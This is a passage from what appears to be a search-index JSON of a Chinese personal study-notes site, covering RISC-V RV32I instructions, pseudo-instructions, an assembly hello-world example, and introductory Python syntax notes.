\u6307\u4ee4\u683c\u5f0f \uff1asb rs2, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs2 \u7684\u4f4e 8 \u4f4d\u62f7\u8d1d\u5230 rs1 + imm \u5904\u5185\u5b58\u4e2d sh S \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 001 imm[4:0] 0100011 \u6307\u4ee4\u683c\u5f0f \uff1ash rs2, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs2 \u7684\u4f4e 16 \u4f4d\u62f7\u8d1d\u5230 rs1 + imm \u5904\u5185\u5b58\u4e2d sw S \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 010 imm[4:0] 0100011 \u6307\u4ee4\u683c\u5f0f \uff1asw rs2, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs2\uff0832 \u4f4d\uff09\u62f7\u8d1d\u5230 rs1 + imm \u5904\u5185\u5b58\u4e2d \u6c47\u7f16\u4f2a\u6307\u4ee4 \u00b6 \u524d\u9762\u7684\u662f RV32I \u7684\u6240\u6709\u88ab\u7f16\u7801\u7684\u6307\u4ee4\uff0c\u4e0b\u9762\u662f\u53ef\u4ee5\u5728 RV32I \u6c47\u7f16\u7a0b\u5e8f\u4e2d\u5199\u7684\u4f2a\u6307\u4ee4\uff0c\u5b83\u4eec\u5c06\u88ab\u7f16\u8bd1\u5668\u7f16\u8bd1\u4e3a\u7b2c\u4e8c\u5217\u4e2d\u7684\u5b9e\u9645\u6307\u4ee4 .small-table table { font-size: 0.55rem !important; } \u4f2a\u6307\u4ee4 \u5b9e\u9645\u6307\u4ee4 \u610f\u4e49 la/lla rd, symbol auipc rd, delta[31 : 12] + delta[11] addi rd, rd, delta[11:0] \u52a0\u8f7d\u7edd\u5bf9\u5730\u5740 delta = symbol - pc l{b|h|w} rd, symbol auipc rd, delta[31 : 12] + delta[11] l{b|h|w} rd, delta[11:0](rd) \u52a0\u8f7d\u5168\u5c40\u53d8\u91cf s{b|h|w} rd, symbol, rt auipc rt, delta[31 : 12] + delta[11] s{b|h|w} rd, delta[11:0](rt) \u4fdd\u5b58\u5168\u5c40\u53d8\u91cf nop addi x0, x0, 0 li rd, imm ... \u5c06\u7acb\u5373\u6570\u52a0\u8f7d\u5230 rd \u4e2d mov rd, rs addi rd, rs, 0 \u4ece rs \u62f7\u8d1d\u5230 rd not rd, rs xori rd, rs, -1 rd = ~rs \u6309\u4f4d\u53d6\u53cd neg rd, rs sub rd, x0, rs rd = -rs seqz rd, rs sltiu rd, rs, 1 set rd if rs == 0 snez rd, rs sltu rd, x0, rs set rd if rs != 0 sltz rd, rs slt rd, rs, x0 set rd if rs < 0 sgtz rd, rs slt rd, x0, rs set rd if rs > 0 beqz rs, offset beq rs, x0, offset branch if rs == 0 bnez rs, offset bne rs, x0, offset branch if rs != 0 blez rs, offset bge x0, rs, offset branch if rs <= 0 bgez rs, offset bge rs, x0, offset branch if rs >= 0 bltz rs, offset blt rs, x0, offset branch if rs < 0 bgtz rs, offset blt x0, rs, offset branch if rs > 0 bgt rs, rt, offset blt rt, rs, offset branch if rs > rt ble rs, rt, offset bge rt, rs, offset branch if rs <= rt bgtu rs, rt, offset bltu rt, rs, offset branch if > unsigned bleu rs, rt, offset bgeu rt, rs, offset branch if <= unsigned j offset jal x0, offset \u65e0\u6761\u4ef6\u8df3\u8f6c\uff0c\u4e0d\u5b58\u8fd4\u56de\u5730\u5740 jal offset jal x1, offset \u65e0\u6761\u4ef6\u8df3\u8f6c\uff0c\u8fd4\u56de\u5730\u5740\u5b58\u5230 x1 jr rs jalr x0, 0(rs) \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230 rs \u4f4d\u7f6e\uff0c\u5ffd\u7565\u8fd4\u56de\u5730\u5740 jalr rs jalr x1, 0(rs) \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230 rs \u4f4d\u7f6e\uff0c\u5b58\u8fd4\u56de\u5730\u5740 ret jalr x0, 0(x1) \u901a\u8fc7\u8fd4\u56de\u5730\u5740 x1 \u8fd4\u56de call offset auipc x1, offset[31 : 12] + offset[11] jalr x1, offset[11:0](x1) \u8fdc\u8c03\u7528 tail offset auipc x6, offset[31 : 12] + offset[11] jalr x0, offset[11:0](x6) \u5ffd\u7565\u8fd4\u56de\u5730\u5740\u8fdc\u8c03\u7528 \u6c47\u7f16\u4ee3\u7801 \u00b6 .text .align 2 .globl main main: addi sp , sp , -16 sw ra , 12 ( sp ) lui a0 , %hi ( string1 ) addi a0 , a0 , %lo ( string1 ) lui a1 , %hi ( string2 ) addi a1 , a1 , %lo ( string2 ) call printf lw ra , 12 ( sp ) addi sp , sp , 16 li a0 , 0 ret .section .rodata .balign 4 string1: .string \"Hello, %s!\\n\" string2: .string \"world\" .text\uff1a\u8fdb\u5165\u4ee3\u7801\u6bb5 .align 2\uff1a\u4ee3\u7801\u6bb5\u5bf9\u9f50\u5230 2^2 \u5b57\u8282 .globl main\uff1a\u58f0\u660e\u5168\u5c40\u6807\u53f7 main .section .rodata\uff1a\u8fdb\u5165 rodata \u6bb5 .balign 4\uff1a\u5bf9\u9f50\u6570\u636e\u6bb5\u5230 4 \u5b57\u8282 .string ... \u5b9a\u4e49\u5b57\u7b26\u4e32 \u5176\u5b83\u6307\u4ee4\uff1a .data\uff1a\u8fdb\u5165\u6570\u636e\u6bb5 .bss\uff1a\u8fdb\u5165 bss \u6bb5 .byte b1, b2, ..., bn\uff1a\u5b58\u653e\u4e00\u4e9b\u5b57\u8282 .half w1, w2, ..., wn\uff1a\u5b58\u653e\u4e00\u4e9b\u534a\u5b57\uff0816 \u4f4d\uff09 .word w1, w2, ..., wn\uff1a\u5b58\u653e\u4e00\u4e9b\u5b57\uff0832 \u4f4d\uff09","title":"RISC-V ISA"},{"location":"cs/pl/riscv/#risc-v-isa","text":"Abstract RISC-V ISA Unprivileged Spec v.20191213 \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u201c\uff08\u5927\u4e00\u6625\u590f\uff09\u8bfe\u7a0b","title":"RISC-V ISA"},{"location":"cs/pl/riscv/#_1","text":"RISC-V \u662f\u4e00\u4e2a ISA \u6807\u51c6 RISC-V \u662f\u5b8c\u5168\u5f00\u653e\u7684\uff0c\u5141\u8bb8\u4efb\u4f55\u4eba\u4f7f\u7528 \u7b80\u5355\u3001\u53ef\u6269\u5c55 \u5206\u4e3a\u7528\u6237\u7ea7\u6307\u4ee4\u96c6\u89c4\u8303\uff08User-level ISA spec\uff09\u548c\u7279\u6743\u7ea7\u6307\u4ee4\u96c6\u89c4\u8303\uff08Privilege ISA spec\uff09\u7b49 \u547d\u540d\u4e3a RV + \u6570\u636e\u5bbd\u5ea6 + \u6269\u5c55","title":"\u57fa\u7840\u77e5\u8bc6"},{"location":"cs/pl/riscv/#_2","text":"\u57fa\u7840\u6307\u4ee4\u96c6\uff1aRV32I\u3001RV64I\uff0832/64 \u4f4d\u5e26\u6709\u6574\u578b\u64cd\u4f5c\u7684\u6307\u4ee4\u96c6\uff09\u3001RV32E\uff08\u53ea\u6709 16 \u4e2a\u5bc4\u5b58\u5668\u7684 32 \u4f4d\u6574\u578b\u6307\u4ee4\u96c6\uff09 I\uff1a\u5e26\u6709 ALU \u8fd0\u7b97\u3001\u5206\u652f\u8df3\u8f6c\u3001\u88c5\u8f7d\u5b58\u50a8 \u6269\u5c55\uff1a M\uff1a\u589e\u52a0\u6574\u578b\u4e58\u6cd5\u3001\u9664\u6cd5 A\uff1a\u539f\u5b50\u6307\u4ee4 F\uff1a\u589e\u52a0\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570 D\uff1a\u589e\u52a0\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570 Q\uff1a\u589e\u52a0 128 \u4f4d\u56db\u7cbe\u5ea6\u6d6e\u70b9\u6570 G\uff1a= IMAFD ... \u6269\u5c55\u4e86\u7684\u6307\u4ee4\u96c6\u5219\u547d\u540d\u4e3a RV32IM\u3001RV32IMA\u3001RV32G \u7b49\u7b49","title":"\u6307\u4ee4\u96c6"},{"location":"cs/pl/riscv/#_3","text":"","title":"\u7f16\u8bd1\u8fd0\u884c"},{"location":"cs/pl/riscv/#rv32i","text":"","title":"RV32I \u57fa\u7840"},{"location":"cs/pl/riscv/#_6","text":"\u4e00\u4e2a PC \u5bc4\u5b58\u5668\uff08program counter\uff09 32 \u4e2a 32 \u4f4d\u5bc4\u5b58\u5668\uff08x0~x31\uff09 \u5176\u4e2d x0 \u6c38\u8fdc\u662f 0 \u5bc4\u5b58\u5668\u7684\u5e38\u7528\u7528\u9014\u5982\u4e0b\uff1a \u5bc4\u5b58\u5668 ABI \u540d\u79f0 \u7528\u9014\u63cf\u8ff0 saver x0 zero \u786c\u4ef6 0 x1 ra \u8fd4\u56de\u5730\u5740\uff08return address\uff09 caller x2 sp \u6808\u6307\u9488\uff08stack pointer\uff09 callee x3 gp \u5168\u5c40\u6307\u9488\uff08global pointer\uff09 x4 tp \u7ebf\u7a0b\u6307\u9488\uff08thread pointer\uff09 x5 t0 \u4e34\u65f6\u53d8\u91cf/\u5907\u7528\u94fe\u63a5\u5bc4\u5b58\u5668\uff08alternate link reg\uff09 caller x6-7 t1-2 \u4e34\u65f6\u53d8\u91cf caller x8 s0/fp \u9700\u8981\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668/\u5e27\u6307\u9488\uff08frame pointer\uff09 callee x9 s1 \u9700\u8981\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668 callee x10-11 a0-1 \u51fd\u6570\u53c2\u6570/\u8fd4\u56de\u503c caller x12-17 a2-7 \u51fd\u6570\u53c2\u6570 caller x18-27 s2-11 \u9700\u8981\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668 callee x28-31 t3-6 \u4e34\u65f6\u53d8\u91cf caller \u5176\u4e2d sp s0-11 \u9700\u8981\u5728\u51fd\u6570\u8c03\u7528\u524d\u540e\u4fdd\u8bc1\u4e00\u81f4\uff0c\u5176\u5b83\u4e0d\u7528\u4fdd\u8bc1","title":"\u5bc4\u5b58\u5668"},{"location":"cs/pl/riscv/#_7","text":"RV32I \u6709 4 \u79cd\u57fa\u7840\u7684\u6307\u4ee4\u683c\u5f0f\uff08R/I/S/U\uff09\uff0c\u518d\u6839\u636e\u7acb\u5373\u6570\u89e3\u7801\u7684\u4e0d\u540c\u53c8\u5206\u51fa\u4e24\u79cd\uff08B/J\uff09\uff0c\u603b\u5171\u516d\u79cd\u6307\u4ee4\u683c\u5f0f","title":"\u6307\u4ee4\u683c\u5f0f"},{"location":"cs/pl/riscv/#rv32i_1","text":"","title":"RV32I \u6307\u4ee4"},{"location":"cs/pl/riscv/#_8","text":"","title":"\u6574\u578b\u8ba1\u7b97\u6307\u4ee4"},{"location":"cs/pl/riscv/#_14","text":"","title":"\u63a7\u5236\u6d41\u53d8\u5316\u6307\u4ee4"},{"location":"cs/pl/riscv/#_15","text":"","title":"\u88c5\u8f7d\u5b58\u50a8\u6307\u4ee4"},{"location":"cs/pl/riscv/#_16","text":"\u524d\u9762\u7684\u662f RV32I \u7684\u6240\u6709\u88ab\u7f16\u7801\u7684\u6307\u4ee4\uff0c\u4e0b\u9762\u662f\u53ef\u4ee5\u5728 RV32I \u6c47\u7f16\u7a0b\u5e8f\u4e2d\u5199\u7684\u4f2a\u6307\u4ee4\uff0c\u5b83\u4eec\u5c06\u88ab\u7f16\u8bd1\u5668\u7f16\u8bd1\u4e3a\u7b2c\u4e8c\u5217\u4e2d\u7684\u5b9e\u9645\u6307\u4ee4 .small-table table { font-size: 0.55rem !important; } \u4f2a\u6307\u4ee4 \u5b9e\u9645\u6307\u4ee4 \u610f\u4e49 la/lla rd, symbol auipc rd, delta[31 : 12] + delta[11] addi rd, rd, delta[11:0] \u52a0\u8f7d\u7edd\u5bf9\u5730\u5740 delta = symbol - pc l{b|h|w} rd, symbol auipc rd, delta[31 : 12] + delta[11] l{b|h|w} rd, delta[11:0](rd) \u52a0\u8f7d\u5168\u5c40\u53d8\u91cf s{b|h|w} rd, symbol, rt auipc rt, delta[31 : 12] + delta[11] s{b|h|w} rd, delta[11:0](rt) \u4fdd\u5b58\u5168\u5c40\u53d8\u91cf nop addi x0, x0, 0 li rd, imm ... \u5c06\u7acb\u5373\u6570\u52a0\u8f7d\u5230 rd \u4e2d mov rd, rs addi rd, rs, 0 \u4ece rs \u62f7\u8d1d\u5230 rd not rd, rs xori rd, rs, -1 rd = ~rs \u6309\u4f4d\u53d6\u53cd neg rd, rs sub rd, x0, rs rd = -rs seqz rd, rs sltiu rd, rs, 1 set rd if rs == 0 snez rd, rs sltu rd, x0, rs set rd if rs != 0 sltz rd, rs slt rd, rs, x0 set rd if rs < 0 sgtz rd, rs slt rd, x0, rs set rd if rs > 0 beqz rs, offset beq rs, x0, offset branch if rs == 0 bnez rs, offset bne rs, x0, offset branch if rs != 0 blez rs, offset bge x0, rs, offset branch if rs <= 0 bgez rs, offset bge rs, x0, offset branch if rs >= 0 bltz rs, offset blt rs, x0, offset branch if rs < 0 bgtz rs, offset blt x0, rs, offset branch if rs > 0 bgt rs, rt, offset blt rt, rs, offset branch if rs > rt ble rs, rt, offset bge rt, rs, offset branch if rs <= rt bgtu rs, rt, offset bltu rt, rs, offset branch if > unsigned bleu rs, rt, offset bgeu rt, rs, offset branch if <= unsigned j offset jal x0, offset \u65e0\u6761\u4ef6\u8df3\u8f6c\uff0c\u4e0d\u5b58\u8fd4\u56de\u5730\u5740 jal offset jal x1, offset \u65e0\u6761\u4ef6\u8df3\u8f6c\uff0c\u8fd4\u56de\u5730\u5740\u5b58\u5230 x1 jr rs jalr x0, 0(rs) \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230 rs \u4f4d\u7f6e\uff0c\u5ffd\u7565\u8fd4\u56de\u5730\u5740 jalr rs jalr x1, 0(rs) \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230 rs \u4f4d\u7f6e\uff0c\u5b58\u8fd4\u56de\u5730\u5740 ret jalr x0, 0(x1) \u901a\u8fc7\u8fd4\u56de\u5730\u5740 x1 \u8fd4\u56de call offset auipc x1, offset[31 : 12] + offset[11] jalr x1, offset[11:0](x1) \u8fdc\u8c03\u7528 tail offset auipc x6, offset[31 : 12] + offset[11] jalr x0, offset[11:0](x6) \u5ffd\u7565\u8fd4\u56de\u5730\u5740\u8fdc\u8c03\u7528","title":"\u6c47\u7f16\u4f2a\u6307\u4ee4"},{"location":"cs/pl/riscv/#_17","text":".text .align 2 .globl main main: addi sp , sp , -16 sw ra , 12 ( sp ) lui a0 , %hi ( string1 ) addi a0 , a0 , %lo ( string1 ) lui a1 , %hi ( string2 ) addi a1 , a1 , %lo ( string2 ) call printf lw ra , 12 ( sp ) addi sp , sp , 16 li a0 , 0 ret .section .rodata .balign 4 string1: .string \"Hello, %s!\\n\" string2: .string \"world\" .text\uff1a\u8fdb\u5165\u4ee3\u7801\u6bb5 .align 2\uff1a\u4ee3\u7801\u6bb5\u5bf9\u9f50\u5230 2^2 \u5b57\u8282 .globl main\uff1a\u58f0\u660e\u5168\u5c40\u6807\u53f7 main .section .rodata\uff1a\u8fdb\u5165 rodata \u6bb5 .balign 4\uff1a\u5bf9\u9f50\u6570\u636e\u6bb5\u5230 4 \u5b57\u8282 .string ... \u5b9a\u4e49\u5b57\u7b26\u4e32 \u5176\u5b83\u6307\u4ee4\uff1a .data\uff1a\u8fdb\u5165\u6570\u636e\u6bb5 .bss\uff1a\u8fdb\u5165 bss \u6bb5 .byte b1, b2, ..., bn\uff1a\u5b58\u653e\u4e00\u4e9b\u5b57\u8282 .half w1, w2, ..., wn\uff1a\u5b58\u653e\u4e00\u4e9b\u534a\u5b57\uff0816 \u4f4d\uff09 .word w1, w2, ..., wn\uff1a\u5b58\u653e\u4e00\u4e9b\u5b57\uff0832 \u4f4d\uff09","title":"\u6c47\u7f16\u4ee3\u7801"},{"location":"cs/pl/python/","text":"Python \u00b6 Abstract \u6211\u5728 2018 \u5e74\u63a5\u89e6\u7684\u7b2c\u4e00\u95e8\u7f16\u7a0b\u8bed\u8a00\uff0c\u4e5f\u662f\u6700\u5e38\u7528\u3001\u6700\u719f\u7ec3\u7684\u4e00\u95e8\u4e86 \u8fd9\u91cc\u4e1c\u897f\u8fd8\u4e0d\u5168\uff0c\u6709\u65f6\u95f4\u518d\u8865\u5145\u5427 (:\u0437\u300d\u2220) Table of Contents \u00b6 Python \u8bed\u6cd5\u57fa\u7840 NumPy \u79d1\u5b66\u8ba1\u7b97\u5e93\uff08 WIP \uff09 PIL \u56fe\u50cf\u5904\u7406\u5e93\uff08 WIP \uff09 MatPlotLib \u4f5c\u56fe\u5e93\uff08 \u751a\u81f3\u6587\u4ef6\u5939\u90fd\u6ca1\u5efa \uff09","title":"Python"},{"location":"cs/pl/python/#python","text":"Abstract \u6211\u5728 2018 \u5e74\u63a5\u89e6\u7684\u7b2c\u4e00\u95e8\u7f16\u7a0b\u8bed\u8a00\uff0c\u4e5f\u662f\u6700\u5e38\u7528\u3001\u6700\u719f\u7ec3\u7684\u4e00\u95e8\u4e86 \u8fd9\u91cc\u4e1c\u897f\u8fd8\u4e0d\u5168\uff0c\u6709\u65f6\u95f4\u518d\u8865\u5145\u5427 (:\u0437\u300d\u2220)","title":"Python"},{"location":"cs/pl/python/#table-of-contents","text":"Python \u8bed\u6cd5\u57fa\u7840 NumPy \u79d1\u5b66\u8ba1\u7b97\u5e93\uff08 WIP \uff09 PIL \u56fe\u50cf\u5904\u7406\u5e93\uff08 WIP \uff09 MatPlotLib \u4f5c\u56fe\u5e93\uff08 \u751a\u81f3\u6587\u4ef6\u5939\u90fd\u6ca1\u5efa \uff09","title":"Table of Contents"},{"location":"cs/pl/python/basic/","text":"Python \u8bed\u6cd5\u57fa\u7840 \u00b6 Abstract \u61d2\u5f97\u518d\u6574\u7406\u4e86\uff0c\u57fa\u672c\u4e0a\u662f\u4e4b\u524d\u4e00\u6b21 Python \u57fa\u7840\u6559\u5b66\u76f4\u64ad\u7684 slides \u6587\u5b57\u5185\u5bb9\uff0c\u5173\u4e8e\u57fa\u7840\u6559\u5b66\uff1a GitHub \u4ed3\u5e93\uff1a TonyCrane/PythonLecture slides\uff1a https://slides.tonycrane.cc/PythonLecture/ \u90e8\u5206\u76f4\u64ad\u56de\u653e\uff1a https://www.bilibili.com/video/BV13Z4y1h7x5/?vd_source=c0de364997e494206a0fb88c9ee8bfb1 \u8fd9\u91cc\u662f\u7eaf\u7684 slides \u6539\u5199\uff0c\u6548\u679c\u6ca1\u6709\u76f4\u63a5\u770b slides \u597d\uff0c\u800c\u4e14\u53ef\u80fd\u6709\u9519\u8bef\uff0c\u53d1\u73b0\u8bf7\u53ca\u65f6\u8bc4\u8bba\u544a\u8bc9\u6211 \u4ec0\u4e48\u662f python \u00b6 \u89e3\u91ca\u6027\u7684\u811a\u672c\u8bed\u8a00\uff1a\u901a\u8fc7\u89e3\u91ca\u5668\u6765\u76f4\u63a5\u8fd0\u884c\uff0c\u4e0d\u9700\u8981\u7f16\u8bd1\u94fe\u63a5\u6210\u4e8c\u8fdb\u5236\u6587\u4ef6 \u52a8\u6001\u7c7b\u578b\u8bed\u8a00\uff1a\u7c7b\u578b\u5728\u8fd0\u884c\u65f6\u786e\u5b9a\uff0c\u4e0d\u9700\u8981\u901a\u8fc7\u4ee3\u7801\u660e\u6587\u89c4\u5b9a \u9762\u5411\u5bf9\u8c61\u8bed\u8a00\uff1apython \u4e2d\u4e00\u5207\u7686\u5bf9\u8c61 ... \u600e\u4e48\u88c5 python \u00b6 \u88c5\u7684\u662f\u4ec0\u4e48\uff1f \u662f\u4e00\u4e2a python \u89e3\u91ca\u5668 \uff0c\u4ee5\u53ca\u8fd0\u884c\u9700\u8981\u7684 \u73af\u5883 \u600e\u4e48\u88c5\uff1f \u5b98\u65b9\u7f51\u7ad9 https://www.python.org/downloads/ conda\uff08\u4e00\u4e2a\u597d\u7528\u7684 python \u73af\u5883\u7ba1\u7406\u5de5\u5177\uff09 anaconda \uff08\u5927\u3001\u6709\u9884\u88c5\u73af\u5883\uff09 https://www.anaconda.com/ miniconda \uff08\u5c0f\uff09 https://docs.conda.io/en/latest/miniconda \u6781\u4e0d\u5efa\u8bae\u901a\u8fc7\u5fae\u8f6f\u5e94\u7528\u5546\u5e97\u5b89\u88c5 python \u88c5\u4ec0\u4e48\u7248\u672c\uff1f \u4e24\u4e2a\u5927\u7248\u672c\uff0c2.* \u548c 3.*\uff0c\u5dee\u522b\u8f83\u5927\uff0c\u5efa\u8bae 3.* \u4e00\u4e9b\u5c0f\u7248\u672c\uff0c3.6 \u53ca\u4e4b\u524d\u4e0d\u63a8\u8350\uff0c3.7 3.8 \u7a33\u5b9a\uff0c3.9 3.10 \u5b8c\u5584\u4e2d\uff0c3.11 \u9884\u89c8\u4e2d \u7ec6\u5206\u7248\u672c\uff0c\u9009\u62e9\u6700\u65b0\uff0c3.7.13\u30013.8.13\u30013.9.12\u30013.10.4 conda \u4e0d\u5fc5\u62c5\u5fc3\u7248\u672c\uff0c\u9ed8\u8ba4 3.9\uff0c\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u865a\u62df\u73af\u5883\u6765\u4f7f\u7528\u4e0d\u540c\u7248\u672c \u600e\u4e48\u7f16\u5199\u3001\u8fd0\u884c python \u00b6 \u600e\u4e48\u7528 python\uff1f \u8bb0\u4f4f\u4f60\u4e0b\u8f7d\u7684\u662f\u4e00\u4e2a\u89e3\u91ca\u5668\uff0c\u5efa\u8bae\u901a\u8fc7\u547d\u4ee4\u884c\u8fd0\u884c python code.py \u4ec0\u4e48\u662f\u547d\u4ee4\u884c\uff1f \u901a\u8fc7\u8f93\u5165\u547d\u4ee4\u6765\u901a\u77e5\u7535\u8111\u6267\u884c\u67d0\u6307\u4ee4\u3001\u6216\u8005\u8fd0\u884c\u67d0\u7a0b\u5e8f Windows\uff1acmd\u3001Powershell -> \u5355\u72ec\u8fd0\u884c / Windows Terminal /... macOS\uff1azsh\u3001... -> \u7ec8\u7aef / iTerm /... Linux\uff1abash\u3001zsh\u3001... -> \u7ec8\u7aef / ... \u7528\u4ec0\u4e48\u5199\u4ee3\u7801\uff1f \u8bb0\u4f4f\u4f60\u7f16\u5199\u7684\u53ea\u662f\u4e00\u4e2a .py \u4f5c\u4e3a\u6269\u5c55\u540d\u7684\u6587\u672c\u6587\u4ef6 \u53ea\u8981\u6587\u672c\u7f16\u8f91\u5668\u90fd\u53ef\u4ee5\u5199 \u8bb0\u4e8b\u672c\u3001\u81ea\u5e26 IDLE\u3001word Notepad++\u3001Sublime Text VSCode\uff08Visual Studio Code\uff0c\u4e0d\u662f VS\uff09 code.visualstudio.com Pycharm\uff08Community Edition \u5c31\u591f\u7528\uff09 jetbrains.com/pycharm \u53d8\u91cf \u00b6 \u7ed9\u4e00\u4e2a\u5185\u5bb9\u7ed1\u5b9a\u4e00\u4e2a\u6807\u7b7e\u5373\u53d8\u91cf\u540d\uff08\u6ce8\u610f\u8bf7\u4e0d\u8981\u8ba4\u4e3a\u53d8\u91cf\u7c7b\u4f3c\u4e00\u4e2a\u201c\u76d2\u5b50\u201d\uff09 \u901a\u8fc7 = \u6765\u5b9a\u4e49\u53d8\u91cf\uff0c\u53d8\u91cf\u540d = \u5185\u5bb9 \u52a8\u6001\u7c7b\u578b\uff0c\u4e0d\u9700\u8981\u89c4\u5b9a\u7c7b\u578b\uff08\u53ef\u4ee5\u901a\u8fc7 \u53d8\u91cf\u540d: \u7c7b\u578b = \u5185\u5bb9 \u6765\u8fdb\u884c\u7c7b\u578b\u6807\u6ce8\uff09 \u53d8\u91cf\u540d \u53ea\u80fd\u5305\u542b\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u4e0b\u5212\u7ebf\u3001 \u4e2d\u6587 \uff0c\u4e0d\u80fd\u6709\u7a7a\u683c\u548c\u5176\u5b83\u7b26\u53f7 \u53ea\u80fd\u4ee5\u5b57\u6bcd\u3001\u4e0b\u5212\u7ebf\u5f00\u5934\uff0c\u4e0d\u80fd\u4ee5\u6570\u5b57\u5f00\u5934\uff0c\u800c\u4e14\u5927\u5c0f\u5199\u654f\u611f \u4e0d\u80fd\u7528\u5173\u952e\u5b57\uff08\u4f8b\u5982 if def \u7b49\uff09\u4f5c\u4e3a\u53d8\u91cf\u540d\uff0c\u4e0d\u63a8\u8350\u4f7f\u7528\u5185\u7f6e\u51fd\u6570\u540d\u4f5c\u4e3a\u53d8\u91cf\u540d \u6e05\u6670\u660e\u786e\u3001\u98ce\u683c\u7edf\u4e00 \u5168\u5927\u5199\u4e00\u822c\u8868\u793a\u5e38\u91cf\u3001\u4e0d\u5efa\u8bae\u4f7f\u7528\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u6216\u8005\u5f00\u5934\u7ed3\u5c3e\u3001\u4e0d\u5efa\u8bae\u4f7f\u7528 _ \u4f5c\u4e3a\u53d8\u91cf\u540d \u6570\u636e\u7c7b\u578b \u00b6 \u6570\u5b57\u4e0e\u8fd0\u7b97 \u00b6 1 \u662f\u6574\u6570\uff0c1. \u662f\u6d6e\u70b9\u6570 \u6574\u6570\u4e0e\u6d6e\u70b9\u6570\u8f6c\u6362 int(...)\uff1a\u5411 0 \u820d\u5165 round(...)\uff1a\u5411\u5076\u820d\u5165\uff08\u56db\u820d\u516d\u5165\u4e94\u51d1\u5076\uff0c\u53ef\u4ee5\u5f53\u6210\u56db\u820d\u4e94\u5165\uff09 math.floor(...)\u3001math.ceil(...)\uff1a\u4e0b\u53d6\u6574\u3001\u4e0a\u53d6\u6574\uff08\u9700\u8981 import math\uff09 \u8fd0\u7b97 + - * \u52a0\u51cf\u4e58\uff0c\u5de6\u53f3\u90fd\u662f\u6574\u6570\u7ed3\u679c\u4e5f\u662f\u6574\u6570\uff0c\u6709\u6d6e\u70b9\u6570\u7ed3\u679c\u5c31\u662f\u6d6e\u70b9\u6570 / \u9664\u6cd5\uff0c\u7ed3\u679c\u662f\u6d6e\u70b9\u6570\uff08\u5373\u4f7f\u53ef\u4ee5\u6574\u9664\uff09 // \u6574\u9664\uff0c\u7ed3\u679c\u662f\u6574\u6570\uff0c\u5411\u4e0b\u53d6\u6574 % \u53d6\u6a21\uff0ca % b == a - (a//b)*b\uff08\u548c c \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\uff09 ** \u4e58\u65b9\uff0c\u53ef\u4ee5\u662f\u6d6e\u70b9\u6570\uff0c\u6bd4\u5982 a ** 0.5 \u8868\u793a\u5f00\u6839\u53f7 pow(a, b, mod)\uff1a\u4e5f\u662f\u4e58\u65b9\uff0cmod \u53ef\u4ee5\u7701\u7565\uff0c\u5982\u679c\u6709 mod \u5219\u5bf9\u7ed3\u679c\u53d6\u6a21\uff0c\u5982\u679c mod \u4e3a -1 \u5219\u8ba1\u7b97\u4e58\u6cd5\u9006\u5143 \u66f4\u591a\u8fd0\u7b97\u901a\u8fc7 math\u3001numpy\u3001scipy \u7b49\u5305\u6765\u8fdb\u884c \u590d\u6570\u7c7b\u578b \u00b6 python \u4e2d\u5185\u7f6e\u4e86\u590d\u6570\u7c7b\u578b\uff0c1+2j \u5f62\u5f0f\u5c31\u8868\u793a\u4e00\u4e2a\u590d\u6570\uff0c\u5176\u4e2d j \u5373\u865a\u6570\u5355\u4f4d i \u6216\u8005\u4f7f\u7528 complex(\u5b9e\u90e8, \u865a\u90e8) \u5f62\u5f0f\u5b9a\u4e49\u590d\u6570 \u53ef\u4ee5\u8fdb\u884c\u590d\u6570\u7684\u52a0\u51cf\u4e58\u9664\u8fd0\u7b97 \u5c5e\u6027\u4e0e\u65b9\u6cd5 c.real\uff1a\u5b9e\u90e8 c.imag\uff1a\u865a\u90e8 c.conjugate()\uff1a\u8fd4\u56de\u5171\u8f6d\u590d\u6570 \u5b57\u7b26\u4e32 \u00b6 \u5355\u5f15\u53f7 '...'\uff0c\u53cc\u5f15\u53f7 \"...\"\uff0c\u4e09\u5f15\u53f7 '''...''' \"\"\"...\"\"\"\uff08\u53ef\u4ee5\u5185\u90e8\u6362\u884c\uff09 \\n \u6362\u884c\uff0c\\t \u5236\u8868\u7b26\uff0c\\r \u56de\u8f66\uff0c\\' \u5355\u5f15\u53f7\uff0c\\\" \u53cc\u5f15\u53f7\uff0c\\\\ \u659c\u6760\uff08\u53ea\u6253\u4e00\u4e2a \u4f1a\u51fa\u95ee\u9898\uff09\uff0c\u2026\u2026 \u524d\u7f00 r-string\uff1ar\"...\"\uff0c\u5f15\u53f7\u4e2d\u4e0d\u8fdb\u884c\u8f6c\u4e49\uff0c\u5373\u4e00\u4e2a \u5c31\u4ee3\u8868\u659c\u6760\u5b57\u7b26\u672c\u8eab f-string\uff1af\"...\"\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 b-string\uff1ab\"...\"\uff0c\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a bytes\uff0c\u53ea\u80fd\u5305\u542b ASCII \u5b57\u7b26 \u5e38\u7528\u65b9\u6cd5 \u62fc\u63a5\uff1a\u76f4\u63a5\u5c06\u5b57\u7b26\u4e32\u201c\u76f8\u52a0\u201d \"...\".upper()\u3001\"...\".lower()\uff1a\u8f6c\u4e3a\u5168\u5927\u5199\u3001\u5168\u5c0f\u5199 \"...\".title()\uff1a\u5355\u8bcd\u9996\u5b57\u6bcd\u5927\u5199 